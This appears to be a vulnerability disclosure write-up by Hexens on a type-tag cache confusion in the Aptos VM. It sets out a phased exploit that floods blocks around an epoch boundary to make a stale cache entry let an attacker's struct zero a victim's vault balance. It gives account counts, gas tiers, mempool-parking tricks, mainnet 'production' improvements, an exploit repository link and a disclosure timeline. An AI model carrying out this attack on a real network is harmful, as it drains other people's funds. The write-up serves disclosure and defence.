| Variable | Default | Description | 
|---|---|---|
| `ATTACK_BURN_ITERS` | `200` | Gas-burn loop iterations in filler noops | 
| `ATTACK_WARMUP` | `660` | Warmup account count | 
| `ATTACK_INFLATE` | `90` | Inflate account count | 
| `ATTACK_STEAL` | `60` | Steal account count (must be multiple of 4) | 

The defaults are calibrated to work on commodity hardware (12-32 cores, 16-64GB RAM) without any tuning.

### 

The test includes an adaptive dry-run calibration system (`run_adaptive_dry_run`) that
empirically measures the swarm's average block throughput, block rate, etc. before the
actual attack. It sends test bursts of warmup, inflate, and steal-tier transactions, analyzes
how many land per block, and adjusts account counts accordingly. The calibration runs up to 4
rounds, doubling underperforming phases and backing off if consensus gets too slow (this is
only a local test problem as 3 nodes are heavy to run on a single machine when thousands of
transactions fly in).

**The defaults (`ATTACK_WARMUP=660`, `ATTACK_INFLATE=90`, `ATTACK_STEAL=60`) skip the dry-run
entirely.** These values should work reliably across different machines. But idealogically the
dry-run is mandatory for environments where these defaults may be insufficient (e.g., very
fast hardware that processes transactions too quickly, requiring more accounts to saturate
blocks, or more burn-iterations in the modules, or the opposite - very slow hardware).

Most of the problems faced during test development are even making attack worse vs mainnet as a single machine trying to simulate network of nodes under high pressure is very resource heavy.

To enable the dry-run, you need to specifically unset all three variables:

```
# Unset the variables to trigger dry-run calibration:
ATTACK_WARMUP= ATTACK_INFLATE= ATTACK_STEAL= \
  cargo test -p smoke-test -- test_ty_tag_full_attack --nocapture
```
## 

The core idea: **dominate(or mostly dominate) the block space around an epoch
boundary**, trigger a partial cache flush that leaves stale type entries behind, and use
those stale entries to confuse the VM into letting the attacker's struct operate on the
victim's storage - all the stale entries are claimed by the end of the attack, if additional "healing" needed attacker executes burst-recovery phase by fully flushing every validator via struct cache threshold check: this is not used in test as runs shows this case is practically very low probability - has not been encountered in runs.

Realiability and attack safety comes from the exploit abusing the network's own robustness mechanisms (described in details in this and further sections).

- All the numbers used are for this size of network - after crafting this, attacker is doing a dry-run on mainnet and exploit will resize the phases automatically.

The attacker achieves block dominance by leveraging the block proposer's `PriorityIndex`
ordering and the mempool's transaction parking mechanics. All attack transactions are
pre-signed and planted into validator mempools in advance. At activation, \~840 trigger
transactions cascade-promote thousands of parked transactions atomically across all validators.
Each attack phase uses a dedicated account pool at a distinct gas price tier, so the proposer
naturally drains all of one phase before considering the next. In practice this produces near-
ideal dominance — the test demonstrates that even when organic struct-touching transactions are
deliberately injected into every phase at the same gas priority, the attack still succeeds.

```
 ◄── CURRENT EPOCH ──►│◄───────────── TARGET EPOCH ──────────────────────────────────►
                       │
                       │  EPOCH FLUSH (all caches wiped)
                       │
  ┌────────────────────┼──────────────────┐
  │ 1. WARMUP          │  (GAS_HIGHEST)   │  No-ops flood blocks, push out organic
  │   thousands of txns│                  │  traffic. Spans epoch boundary. Clean
  └────────────────────┼──────────────────┘  SNI baseline established.
                       │         │
                       │         ▼
                       │  ┌──────────────────┐
                       │  │ 2. TOUCH         │  Read victim's VaultState. VM caches
                       │  │    (GAS_HIGH)    │  VaultState at TTC[index N].
                       │  └────────┬─────────┘
                       │           │
                       │           ▼
                       │  ┌──────────────────┐
                       │  │ 3. INFLATE       │  Invoke filler modules. Module ID pool
                       │  │    (GAS_MID)     │  exceeds threshold → PATH B fires.
                       │  │                  │  SNI wiped. TTC[N] = VaultState SURVIVES.
                       │  └────────┬─────────┘
                       │           │
                       │           ▼
                       │  ┌──────────────────┐
                       │  │ 4. STEAL         │  Exploit module loads into fresh SNI.
                       │  │    (GAS_MID_LOW) │  StolenStateXX gets index N.
                       │  │                  │  borrow_global_mut<StolenStateXX>(victim)
                       │  │                  │  → TTC hit → VaultState blob → balance = 0
                       │  └────────┬─────────┘
                       │           │
                       │           ▼
                       │  ┌──────────────────┐
                       │  │ 5. RECOVERY      │  (optional) Burst past 1M struct threshold
                       │  │    (OPTIONAL)    │  → Path A fires → full flush_all_caches()
                       │  │                  │  All stale TTC/SNI entries destroyed.
                       │  └──────────────────┘
```
### 

- **Warmup** (GAS\_HIGHEST): Floods blocks with no-ops before and after the epoch boundary.
Pushes out organic traffic and establishes a clean cache baseline — only framework structs
are in the SNI.
- **Touch** (GAS\_HIGH): Reads the victim's `VaultState`, forcing the VM to cache it in the
TTC at a specific struct name index `N`. This is the entry that will become stale.
- **Inflate** (GAS\_MID): Invokes thousands of filler modules to push the module ID pool past
its threshold. This triggers Path B — the SNI is wiped, but the TTC entry for `VaultState` at index `N` survives.
- **Steal** (GAS\_MID\_LOW): Loads the exploit module into the fresh SNI. One of 95 `StolenStateXX` variants lands at index `N`, hits the stale TTC entry, and the VM
silently lets the attacker write to the victim's `VaultState` blob. Balance set to 0.

## 

The attack proceeds through a setup phase followed by four ordered execution phases that start on the edge of an epoch transition and continue within the next epoch. All attack transactions are pre-signed before the epoch window opens and planted into validator mempools using the reverse-sequence-parking technique (see Section 5). Only the trigger transactions (seq 0 for each account) are held back until activation.

Each phase operates at a distinct gas price tier. The specific prices are arbitrary — only the strict ordering matters:

```
GAS_HIGHEST  >  GAS_HIGH  >  GAS_MID  >  GAS_MID_LOW
  (Warmup)       (Touch)     (Inflate)    (Steal)
```
### 

Before any epoch-sensitive operation, the test deploys all required contracts:

1. **Victim vault** (`vault.move`): A simple contract with a `VaultState` struct holding `balance: u64`, `authority: address`, `nonce: u64`, `pad1: u64`, `pad2: u64`. Initialized
with balance = 1,000,000.
2. **Toucher module** (`toucher.move`): Calls `vault::get_balance(victim)`, forcing the VM to
resolve `VaultState` into the TTC. This is a read-only view function that cannot alter state.
3. **Exploit module** (`exploit.move`): Defines 95 `StolenStateXX` structs with the exact same
memory layout as `VaultState` (same field types in the same order). Each has a corresponding `stealXX(victim, amount)` entry function that does `borrow_global_mut<StolenStateXX>(victim)` and sets balance to 0. The 95 variants ensure broad index coverage after Path B.
4. **Filler modules** (800 packages × 13 modules each = 10,400 filler modules): These exist
solely to inflate the module ID pool. Each package contains 13 trivial `noop()` modules and
one "batch invoker" module that imports and calls all 13 siblings. A single `invoke()` call
forces the VM to load 14 module IDs (13 fillers + the invoker). Filler packages are built
in parallel across 20 deployer accounts and cached on disk to avoid repeated compilation.
5. **Organic traffic module** (`organic.move`): A counter-increment module used by 20 background
accounts to simulate \~40 TPS of unrelated organic traffic throughout the test.

Setup also creates and funds all account pools (warmup, touch, inflate, steal, organic) and pre-configures the swarm with the target epoch duration and concurrency level.

### 

**Gas tier: GAS\_HIGHEST · Accounts: \~660 · Txns per account: 30 · Total: \~19,800**

Warmup transactions are lightweight no-ops (`public entry fun noop() {}`) spread across \~660
dedicated accounts. They serve three critical purposes:

1. **Crowd out organic traffic.** At the highest gas tier, these transactions outbid everything
else in the mempool. The block proposer's `PriorityIndex` orders transactions by gas price,
so warmup txns fill blocks completely before any lower-tier transaction is considered. Organic
traffic is displaced to after the attack window.
2. **Span the epoch boundary.** The attack activates \~3 seconds before the target epoch
transition. Warmup transactions begin filling blocks in the current epoch. The epoch
transition (which flushes all caches — SNI, TTC, module cache, module ID pool) happens
naturally while warmup is still running. Post-transition warmup blocks execute against a
clean cache state, ensuring the subsequent phases start with a deterministic baseline.
3. **Establish deterministic struct indices.** Warmup no-ops do not load any user-defined
structs. The only structs interned into the SNI during warmup blocks are the framework types
loaded by `prefetch_aptos_framework` (which loads `transaction_validation` and its transitive
dependencies) and the block prologue (which loads `0x1::block` and its transitive dependencies
including `stake`, `reconfiguration`, `timestamp`, etc.). This means the SNI contains only
framework structs with deterministic indices, giving the victim struct a stable, predictable
starting index when the touch phase begins.

**Why 660 accounts at 30 txns each?** Every account holds at most 30 transactions (1 trigger +
29 parked), staying strictly below the transaction shuffler's `sender_partitioning_threshold` of
32. This prevents the shuffler from treating any single sender as "dominant" and fragmenting
its transactions across output groups. With 660 accounts × 30 txns = 19,800 warmup txns — enough
to fill \~40 blocks at \~500 txns/block. This comfortably spans the final seconds of the current
epoch and the first seconds of the target epoch.

### 

**Gas tier: GAS\_HIGH · Accounts: 30 · Txns per account: 30 · Total: 900**

Touch transactions call `toucher::touch(victim_addr)`, which internally calls
`vault::get_balance(victim_addr)`. This forces the VM to:

1. Load the `vault` module (and its dependencies) into the module cache.
2. Resolve `VaultState`'s `StructIdentifier` into a `StructNameIndex` via the SNI.
3. Convert the `StructNameIndex` to a `StructTag` and cache the mapping in the TTC.

After the touch phase, every validator has a TTC entry like:
`(StructNameIndex(N), []) → StructTag("0xDA::vault::VaultState")`

where `N` is the index assigned by the SNI after the epoch flush (typically in the range 220–230
depending on how many framework structs were loaded by the prologue).

**Why multiple touch accounts?** Redundancy. If a single account's transactions are delayed
(mempool reordering, validator propagation lag), having 30 accounts × 30 txns each (staying
below the shuffler's 32-tx sender threshold) ensures the touch fires in every block of the
touch window. It also works as a statistical block against organic transactions sneaking in.
Only one successful touch is needed, but saturation eliminates timing variance and acts as an
organic transaction blocker.

**Epoch guard:** Touch transactions are designed to be harmless if they execute in the wrong
epoch (before the cache flush). They simply read a balance — no state mutation occurs. The
exploit only matters if the touch fires *after* the epoch transition has flushed the caches,
so the TTC entry is created in the clean post-transition cache. But if executed

### 

**Gas tier: GAS\_MID · Accounts: \~90 · Txns per account: ≤30 · Total: \~1,500+**

Inflate transactions call batch invoker modules. Each batch invoker imports and calls all 13 sibling filler modules within its package, causing the VM to load 14 module IDs per invocation (13 fillers + the invoker itself). The inflate phase cycles through all 800 batch invokers:

```
Inflate txn 1  → invoke b0   → loads 14 module IDs  (running total: ~930 → 944)
Inflate txn 2  → invoke b1   → loads 14 module IDs  (944 → 958)
...
Inflate txn N  → invoke b799 → loads 14 module IDs  (...→ 10,400+)
```
The framework baseline is \~916 interned module IDs (from `prefetch_aptos_framework` and the
block prologue). Loading all 800 batch invokers adds `800 × 14 = 11,200` module IDs, pushing
the total well past the `max_interned_module_ids` threshold of 10,000.

**What happens when the threshold is crossed:**

At the start of the next block after the threshold is exceeded, `check_ready()` in
`code_cache_global_manager.rs` detects `num_interned_module_ids > config.max_interned_module_ids`
and triggers **Path B**:

```
Path B fires:
  ✓ module_id_pool         → FLUSHED (reset to 0)
  ✓ struct_name_index_map  → FLUSHED (indices start from 0 again)
  ✓ module_cache           → FLUSHED (all loaded modules evicted)
  ✗ ty_tag_cache           → NOT FLUSHED (stale entries survive!)
```
After Path B, the TTC still contains: `(StructNameIndex(N), []) → StructTag(VaultState)`.
But the SNI has been wiped clean — it no longer associates index `N` with `VaultState`. The
next module to be loaded will start assigning indices from 0 again.

### 

**Gas tier: GAS\_MID\_LOW · Accounts: \~60 (15 passes × 4 accts/pass) · Txns per account: ≤30 · Total: \~1,485**

Steal transactions execute immediately after Path B fires. The 95 `StolenStateXX` variants are
partitioned across groups of 4 accounts (a "pass"): the first 3 accounts in each pass sign 29
variants + 1 trigger = 30 txns, the 4th signs the remaining 8 variants + 1 trigger = 9 txns.
With 60 accounts, 15 independent passes attempt the full 95-variant sweep. Each account stays
at or below 30 transactions, well under the shuffler's `sender_partitioning_threshold` of 32.

When the exploit module is loaded after Path B, its struct handles are interned into a freshly
rebuilt SNI. The framework modules are re-loaded first (by `prefetch_aptos_framework` and the
block prologue), claiming the low indices. Then the exploit module's 95 `StolenStateXX` structs
are assigned consecutive indices starting from wherever the framework stopped.

**The collision:** One of the 95 variants is assigned `StructNameIndex(N)` — the same index
that the now-stale TTC entry maps to `VaultState`. When that variant's `stealXX` function
executes:

```
1. borrow_global_mut<StolenStateXX>(victim_addr)
2. VM resolves StolenStateXX → StructNameIndex(N)
3. VM checks TTC for (N, []) → FOUND: StructTag("0xDA::vault::VaultState")
4. VM constructs storage key from the stale tag → reads victim's VaultState blob
5. VaultState and StolenStateXX have identical layouts → deserialization succeeds
6. steal function sets balance = 0 → writes back to storage
7. Vault is drained.
```
**Why 95 variants?** By deploying 95 variants,
the exploit covers a range of consecutive indices. In test runs, the victim index typically
falls in the range 220–230, and the 95 variants span from wherever the exploit module's first
struct lands. With a typical framework baseline of \~180–220 indexed structs, 95 variants provide
ample coverage. In a production attack, the attacker would deploy 400–500 variants to cover the
full plausible range.
Besides that this spray of structures firewalls again stale cache indexes created by some low chance sneak of organic txs.

## 

The attack needs thousands of transactions to land in the correct order within a window of roughly 10-30 blocks. In practice, three mechanisms make the ordering essentially deterministic.

### 

Each phase uses a distinct gas price tier with **dedicated account pools**. The specific prices
don't matter — only the strict ordering between tiers. The test uses four tiers:

```
Tier          Phase     Account Pool           Txns per Account
────────────  ───────   ─────────────          ────────────────
GAS_HIGHEST   Warmup    pool 1 (~660 accts)    30  (1 trigger + 29 parked)
GAS_HIGH      Touch     pool 2 (30 accts)      30
GAS_MID       Inflate   pool 3 (~90 accts)     ≤30 (invoke assigned batches)
GAS_MID_LOW   Steal     pool 4 (~60 accts)     ≤30 (partitioned variants)
```
All accounts are capped at **30 transactions** — staying below the transaction shuffler's
`sender_partitioning_threshold` of 32. This ensures no sender is flagged as dominant, keeping
block composition predictable and preventing the shuffler from scattering attack transactions.

The block proposer's `PriorityIndex` orders pending transactions by gas price. Because each
pool uses completely separate accounts, there is no sender-fairness interaction between tiers.
All GAS\_HIGHEST warmup transactions are ordered before the first GAS\_HIGH touch transaction,
all touches before the first GAS\_MID inflate, and all inflates before the first GAS\_MID\_LOW steal.

The absolute gas prices are irrelevant — any four distinct values with the correct ordering
work. The test uses moderate values for simplicity. In a real attack, the attacker would use
extreme gas prices to ensure no organic transaction can compete for ordering priority during
the attack window (see [Potential Improvements](https://hexens.io#8-potential-exploit-improvements)).
Aptos's mempool applies FIFO ordering when tiebreaking. Once warmup transactions
start filling blocks, any organic transaction at a lower gas price must wait until the entire
warmup queue is drained. Even a transaction paying the maximum gas price would need to compete
with the warmup tier being in the same bracket — and with 660 accounts each holding 30 pre-parked
transactions, the warmup phase alone occupies \~40 full blocks.

Each account holds at most 30 transactions, staying below the transaction shuffler's
`sender_partitioning_threshold` of 32 per sender. This is a critical design choice: Aptos's
transaction shuffler detects senders with ≥32 transactions in a block and redistributes them
across output groups for fairness. By keeping every account at 30, no sender triggers this
mechanism, and the block proposer includes the attacker's transactions in their natural gas-price
order without interference.

### 

The attacker needs approximately **\~840 accounts** total across all four pools (\~660 warmup +
30 touch + 90 inflate + 60 steal). The high account count is deliberate: by capping each
account at 30 transactions (below the shuffler's 32-tx sender threshold), the attacker trades
account count for predictable block composition. Account creation on Aptos is trivial
and cheap (creating and funding 840 accounts costs less than 3 APT). In production, the attacker
would pre-fund these accounts well in advance of the attack, days or weeks before activation, to
avoid any observable burst of account creation.

### 

Before the actual attack, the test runs an adaptive calibration phase that empirically measures the swarm's block throughput, gas consumption, and block rate. It does this by sending test bursts of warmup, inflate, and steal-tier transactions and analyzing how many land per block.

The calibration runs up to 4 rounds, doubling the account count for any phase that underperforms. This means the attack adapts to the environment it runs in — faster networks gets more accounts. The core exploit mechanics are hardware-independent - only the throughput parameters change.

### 

```
 TIME ──────────────────────────────────────────────────────────────────────────►
 ◄─────── CURRENT EPOCH ────────► │◄─────────────── TARGET EPOCH ──────────────────►
                                  │
                                  │  ALL CACHES FLUSHED
                                  │  (epoch transition)
                                  │
  organic  organic  organic       │
  ~40 tps  ~40 tps  ~40 tps       │
  ┌─────┐ ┌─────┐ ┌─────┐         │
  │ org │ │ org │ │ org │         │
  └─────┘ └─────┘ └─────┘         │
                                  │
        ACTIVATION                │
        (triggers sent ~3s        │
         before epoch)            │
            │                     │
            ▼                     │
  ┌──────────────────────┐        │  ┌──────────────────────────────────────────┐
  │░░░░░░ WARMUP ░░░░░░░░│────────┼──│░░░░░░░░░░ WARMUP (cont.) ░░░░░░░░░░░░░░░░│
  │ tier = GAS_HIGHEST   │        │  │ Only framework structs in SNI.           │
  │ ~19,800 no-ops       │        │  │ No user structs loaded. Clean baseline.  │
  │ Organic pushed out   │        │  │                                          │
  └──────────────────────┘        │  └────────────────────┬─────────────────────┘
                                  │                       │
                                  │                       ▼
                                  │  ┌──────────────────────────────────────────┐
                                  │  │▓▓▓▓▓▓▓▓▓▓▓▓ TOUCH ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓│
                                  │  │ tier = GAS_HIGH                          │
                                  │  │ vault::get_balance(victim)               │
                                  │  │ VaultState cached at TTC[idx 227]        │
                                  │  └────────────────────┬─────────────────────┘
                                  │                       │
                                  │                       ▼
                                  │  ┌──────────────────────────────────────────┐
                                  │  │██████████ INFLATE ███████████████████████│
                                  │  │ tier = GAS_MID                           │
                                  │  │ Each tx loads 14 filler modules.         │
                                  │  │ Interned module IDs: ~916 ──► 10K+       │
                                  │  │                                          │
                                  │  │  ┌────────────────────────────────────┐  │
                                  │  │  │ PATH B fires.                      │  │
                                  │  │  │ SNI wiped. Module cache wiped.     │  │
                                  │  │  │ TTC *NOT* wiped.                   │  │
                                  │  │  │ TTC[227] still ──► VaultState      │  │
                                  │  │  └────────────────────────────────────┘  │
                                  │  └────────────────────┬─────────────────────┘
                                  │                       │
                                  │                       ▼
                                  │  ┌──────────────────────────────────────────┐
                                  │  │▒▒▒▒▒▒▒▒▒▒ STEAL ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒│
                                  │  │ tier = GAS_MID_LOW                       │
                                  │  │ Exploit module loads into fresh SNI.     │
                                  │  │ 95 StolenState variants interned.        │
                                  │  │                                          │
                                  │  │ StolenStateXX gets assigned idx 227.     │
                                  │  │                                          │
                                  │  │ borrow_global_mut<StolenStateXX>(victim) │
                                  │  │   └─► TTC[227] hit ──► tag = VaultState  │
                                  │  │   └─► same layout ──► no error           │
                                  │  │   └─► .balance = 0                       │
                                  │  │                                          │
                                  │  │       ┌─────────────────────────┐        │
                                  │  │       │   VAULT DRAINED: 0      │        │
                                  │  │       └─────────────────────────┘        │
                                  │  └────────────────────┬─────────────────────┘
                                  │                       │
                                  │                       ▼
                                  │  ┌──────────────────────────────────────────┐
                                  │  │░░ RECOVERY (optional)  ░░░░░░░░░░░░░░░░░░│
                                  │  │ Burst struct interning past 1M entries.  │
                                  │  │ → PATH A fires: flush_all_caches()       │
                                  │  │ TTC, SNI, module cache all wiped clean.  │
                                  │  │ Zero residual stale state guaranteed.    │
                                  │  └────────────────────┬─────────────────────┘
                                  │                       │
                                  │                       ▼
                                  │           Organic traffic resumes.
                                  │           No halt. No fork. No crash.
```
### 

```
  Block    │ Content     │ Phase       │ Notes
  ─────────┼─────────────┼─────────────┼──────────────────────────────────────
  N-3      │ org=4       │             │ normal organic traffic
  N-2      │ org=3       │             │
  N-1      │ org=5       │             │
  ─────────┼─────────────┼─────────────┼──── activation (triggers sent) ──────
  N        │ atk=487     │ WARMUP      │ GAS_HIGHEST floods blocks
  N+1      │ atk=502     │ WARMUP      │ organic fully displaced
  N+2      │ atk=510     │ WARMUP      │
  ═════════╪═════════════╪═════════════╪══════ EPOCH BOUNDARY ════════════════
  N+3      │ atk=498     │ WARMUP      │ caches flushed; clean SNI
  N+4      │ atk=445     │ WARMUP      │ only framework structs interned
  N+5      │ atk=480     │ TOUCH       │ VaultState ──► TTC[227]
  N+6      │ atk=420     │ TOUCH       │
  N+7      │ atk=390     │ INFLATE     │ module IDs climbing: 2K...5K...8K
  N+8      │ atk=405     │ INFLATE     │ ...9K...
  N+9      │ atk=380     │ INFLATE     │ crosses 10K ──► PATH B fires
  N+10     │ atk=350     │ STEAL       │ StolenStateXX ──► idx 227
  N+11     │ atk=285     │ STEAL       │ vault balance = 0
  ─────────┼─────────────┼─────────────┼──────────────────────────────────────
  N+12     │ org=3       │             │ organic resumes normally
  N+13     │ org=5       │             │
```
Each block is filled by the proposer from the highest gas tier downward. Since each phase uses a distinct tier and dedicated accounts, the phases naturally tile into contiguous block ranges without any explicit coordination. Organic traffic (at baseline gas prices) cannot compete with any attack tier and is displaced to before and after the attack window.

## 

The high success rate is not accidental — it follows from several reinforcing mechanisms that collectively make the attack near-deterministic under real network conditions.

Idealogically this exploit uses systems robustness mechanism and self-healing to actually stabilize the exploitation.

**Calibrated phase sizing.** The adaptive dry-run system measures the swarm's actual block
throughput before the attack and sizes each phase accordingly. This ensures that warmup
transactions span the epoch boundary, inflation transactions cross the module ID threshold,
and steal transactions fill enough post-Path-B blocks to cover the target index range. The
calibration adapts to the specific hardware: faster machines get fewer accounts, slower
machines get more. The core exploit mechanics are hardware-independent; only the throughput
parameters change.

**Mempool feng shui.** The attack leverages the block proposer's `PriorityIndex` and gas
bracket mechanisms to enforce strict phase ordering. Each phase uses a dedicated account pool
at a distinct gas price tier. The proposer drains higher-gas transactions before lower-gas
ones, and because each pool uses completely separate accounts, there is no sender-fairness
interaction between tiers. This gives the attacker near-total (in practice, full) dominance
over the block contents during the attack window.

**Transaction parking and cascade promotion.** All attack transactions (sequences 1 through N)
are planted into validator mempools well in advance. They sit in the parking lot, invisible to
the priority queue, until the trigger (sequence 0) lands. The trigger causes the entire
sequence chain to cascade-promote atomically within a single mempool tick. This gives the
attacker the fastest possible propagation primitive — thousands of transactions become ready
very fast, on every validator, through both QuorumStore and direct validator submission
(approximately half of validators have been observed to have VFN REST APIs open, but even if not Discovery Layer could be used to park info PFNs). The only network cost at activation time is
submitting \~840 triggers (one per account) - which is easily done simultaneously in one go.

Additional observation on parking txs: The attack is propogated as fast as it could have been done, plus attacker choosing highest gas bracket makes it practicly guaranteed that noone will hit that window and accept the insanely high gas prices, but this attack design using parking and epoch transition makes this probability even lower, as while being parked txs dont show up in regular mempool and dont affect gas estimations too, additionally epoch transition basically zeroes the effect that would have be done in warmup phase and lastly - the estimation API has caching of 0.5s which, all of these are benefitial for the attack.

**Phase redundancy absorbs variance (this is one the most important parts).** Each phase consists of hundreds or thousands of
transactions. The warmup phase has \~19,800 no-ops, the touch phase has \~900 reads, the inflate
phase has \~1,500+ module invocations, and the steal phase has \~1,485 struct accesses across 95
variants (15 full passes). This redundancy means that individual transaction failures, reorderings,
organics sneaking in, etc are absorbed without affecting the phase's outcome. The only scenarios that could prevent the
attack from succeeding are probabilistic events with vanishing likelihood under production
conditions:

- **40+ of validators simultaneously restart or experience a network outage** during the
attack window (would break consensus entirely, not just the attack).
- **A very small (\~0.1%) race execution wins against 100-1000+ attack transactions in the same block** on 40+
validators simultaneously — each validator would need to independently schedule the
organic transaction ahead of all attack transactions in Block-STM's speculative execution.

**BFT consensus smooths edge cases (and this).** While no chain halts have been seen during last version of exploit (around 50 runs), interestingly enough the swarm test is more prone to chain halt than the real mainnet environment with 120 validators. Even in the low probability event that a small minority of
validators experience a different execution outcome (e.g., a cache flush from an unexpected
parallel fallback), BFT finality enforces convergence, organic transactions sneaking in and winning the races.
The supermajority's committed state is authoritative.
The minority simply syncs to the majority's state through state sync.
The attack does not need every validator to agree on cache state — it needs the supermajority to
execute the same blocks with the same deterministic result, which is exactly what consensus
guarantees.

**Clean state after the attack.** The exploit's padding (95 struct variants in the test, up to
400–500 in production) creates a situation where, after the steal phase completes, there are no
residual stale cache entries that could interfere with subsequent organic traffic. The stale TTC
entry that was exploited is consumed by the successful steal. All other TTC entries either
correspond to correct index mappings or are for struct types that don't exist on any account
(harmless). The test validates this by checking chain health after the attack: block production
continues, no state divergence is detected, and no validator crashes occur. While the test
demonstrates that recovery is redundant in practice (the chain self-heals), a real attacker
would still want to be safe: after the steal phase, they would burst past the 1,000,000
`max_struct_name_index_map_num_entries` threshold to trigger Path A — a full
`flush_all_caches()` on every validator, wiping TTC, SNI, and module caches entirely. This
guarantees zero residual stale state regardless of whether the attack succeeded or missed.

Lastly attacker also has recovery and stop-latch mechanisms that can be used too.

## 

The attacker has two optional safety mechanisms available. Neither is required for the attack to succeed — as the test demonstrates, the chain self-heals if needed and no residual state corruption persists after the attack window. However, a prudent attacker operating against mainnet would use the recovery mechanism as a matter of operational safety.

### 

After the steal phase completes (whether it succeeded or missed), the attacker bursts past the
**1,000,000 `max_struct_name_index_map_num_entries`** threshold — the largest cache threshold
in the system. This triggers Path A: a full `flush_all_caches()` on every validator, wiping
TTC, SNI, module cache, and module ID pool. Every stale entry from the attack is destroyed.
The chain returns to a pristine cache state, and organic traffic continues as if nothing
happened.

The test shows this is redundant in practice — the attack structure plus the padding structs already clean up stale entries, and post-attack health checks confirm normal chain operation. But in a real attack, the cost of the recovery burst (deploying enough modules to intern 1,000,000+ struct names) is trivial compared to the value extracted, and it eliminates any theoretical residual risk with absolute certainty.

### 

If the attacker needs to abort (e.g., observing unexpected organic traffic during the critical inflate phase), they can send "latch" transactions at a gas price higher than GAS\_MID\_LOW (the steal tier) but using in-between sequence numbers. These transactions invalidate the remaining parked steal transactions (which depend on sequential sequence numbers), effectively canceling the steal phase. The warmup, touch, and inflate phases complete harmlessly — without the steal phase, no type confusion occurs.

## 

The test uses conservative parameters to keep execution fast and demonstrate the core primitives. A real attacker operating against mainnet has several straightforward improvements available.

**Extreme gas pricing for guaranteed dominance.** The test uses moderate gas tiers
(GAS\_HIGHEST > GAS\_HIGH > GAS\_MID > GAS\_MID\_LOW) to showcase the ordering primitives. On Aptos
mainnet, organic traffic consistently resides at the lower gas price bounds. An attacker could
use the highest possible gas bracket for all phases — or even prices exceeding the typical
maximum — combined with the `PriorityIndex` ordering logic and correct sequence numbers
(ensuring strict ordering via the same tier + FIFO guarantee, or using progressively decreasing
extreme prices). This would guarantee full block dominance: the proposer would include only the
attacker's transactions until the attack queue is drained. The transaction shuffler's per-sender
threshold of 32 transactions per block is the only constraint, easily addressed by spreading
transactions across more accounts - which is done already in the test. The only scenario where this fails is if another party
submits transactions at a gas price exceeding even the attacker's top bracket — a practically
improbable event that would cost the competitor enormous gas fees for no obvious benefit.

**More struct variants.** The test deploys 95 `StolenState` variants. A production attacker
would deploy 400–500, covering the full plausible index range and making a miss near-impossible
regardless of framework loading order variations.

**Higher warmup volume.** Even more warmup accounts (1,000+) would guarantee epoch-boundary
spanning even on faster networks.

## 

### 

If all warmup transactions execute before the epoch boundary, the epoch transition flushes all
caches including the TTC. The touch phase then runs against a clean cache, the inflate phase
runs, Path B fires — but the TTC entries from the touch phase were created *before* the epoch
flush, so they're already gone. No stale entries exist, no type confusion occurs. The attack
simply doesn't fire, and the chain continues normally.

This is handled by calibrating the warmup volume to span the epoch boundary, which the adaptive dry-run phase measures empirically.

### 

Then there is three cases, either nothing has touched any structs before warmup rules out organics - which case exploit will still succeed, or someone has touched structs but exploit's struct padding (in the test its 100, can be much more) still takes the stale indexes of those accounts the exploit still succeeds. Third case is steal phase missed those missing stale caches - all validators have incorrect deserialization problem, all of them flush - system self-healed attack just missed. Nothing halted.

### 

This is actually expected and designed for. The warmup phase exists specifically to gradually push organic traffic out of the block pipeline. A few organic transactions mixed into early warmup blocks are harmless — they execute their own logic against a cache state that is about to be flushed anyway. The warmup volume (19,800 transactions) ensures that organic traffic is fully displaced well before the touch phase begins.

When organic sneaks in warmup but AFTER the epoch - thats still not a problem for the attack, it will either not add types in cache, or will add some that exploit will pad in future.

### 

Its same as with "organic sneaks in warmup but AFTER the epoch" above.

### 

This is the most sensitive phase, but even here the risk is minimal. The steal phase consists of
up to \~1800 transactions which are not conflicting between each other. And they are not conflicting with organic ones.

This means blockstm will not find conficts.
The redundancy will actually devour organic's chances of filling the stale indexes before attacker. In rare cases when this happens consensus smoothes this out.
In rare cases when organic touches the same state - all of the valdiators will be flushed because of double write conflict - system self-heals.

### 

Everywhere where "an organic" tranasction is mentioned - its equal to saying "multiple small amount of organic transactions" as the attack works on the statictical smoothening of those. In even more rare cases when these sneaking transactions operate on same state - all validators get flush self-healing: the attack just missed, no halt.

### 

It is true, but for blocks with tranasctions that do the same identical thing - it doesn not change anything. In case something sneaks in - its filtered through double safety layer:

1. attacker vs organic density - on average \~0.1-0.5% (on EACH validator) of that happening for a bunch of organic transactions
2. consensus - now if that small probability didnt work on 40+ validators the attack is fine.

### 

With \~100 `StolenState` variants in the current test, the exploit targets a narrow index range.
If the victim struct's index falls outside that range (due to unexpected framework module
loading order), the steal phase simply finds no resource to mutate — every `stealXX` function
checks `exists<StolenStateXX>(victim_addr)` and returns early if the resource doesn't exist.
The attack misses cleanly.

## 

[https://github.com/Hexens/aptos-struct-hijack-exploit](https://github.com/Hexens/aptos-struct-hijack-exploit)

## 

**25 February 2026, 6:44 AM GMT:** A SEAL911 emergency war room was opened to coordinate the disclosure.

**25 February 2026, 9:50 AM GMT:** Hexens disclosed the vulnerability to the vendor after they joined the war room.

**25 February 2026, 2:27 PM to 3:05 PM GMT:** Four major downstream projects were notified using disclosure coordination details and contact information provided by the vendor. The notifications included local-runnable proof-of-concept material and analysis of authority patterns resembling those demonstrated in the PoCs. These notices were precautionary and should not be read as a claim that each downstream production deployment was independently exploited end-to-end.

**27 February 2026, 8:43 PM GMT:** A public pull request became available. The vendor stated that a private validator patch had been deployed earlier than the public pull request.

Hexens provided technical evidence, rerunnable proof-of-concept material, and remained available for follow-up. Although a patch was deployed, as of publication, Hexens had not received a technical rebuttal or evidence-based argument disputing the demonstrated impact classes. The only substantive concern relayed to Hexens related to probabilistic aspects of exploit execution, which the exploit-engineering research and calibration work were specifically designed to address.

## 

We would like to thank the following external parties for spending their time and confirming the impact and validity of the vulnerability.

In alphabetical order:

- Decurity
- GregoAI
- Guardian Audits
- Polygon
